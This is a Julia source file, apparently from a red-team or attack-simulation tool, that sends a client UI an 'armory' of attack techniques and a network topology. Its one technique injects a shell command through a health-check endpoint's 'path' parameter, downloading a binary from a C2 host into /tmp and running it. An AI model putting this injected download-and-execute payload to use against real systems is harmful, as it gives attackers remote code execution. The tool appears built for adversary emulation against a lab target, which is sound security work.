
mutable struct Campaign
    entities::Vector{}
end



function onClientConnected(ev::ClientConnected)
    # send armory
    # send current topology
    println("####   Client connected")

    armory = [
        TTP(
            name="Exploit Envoy Proxy CMD injection",
            id="test",
            tactics=[string(InitialAccess)],
            technique=string(ExploitPublicFacingApp),
            params=ExploitParams(
                endpoint="http://unguard.kube/healthz",
                params=Dict("path" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
                method="GET",
            )
        )
    ]
    topology = Dict(
        "entities" => [],
        "relations" => []
    )

    return SendToUi(Dict("type" => "armory", "data" => armory)), SendToUi(Dict("type" => "topology", "data" => topology))
end

function startCampaign(bus::MessageBus)
    campaign = Campaign([])

    register!(bus, ClientConnected, onClientConnected)
end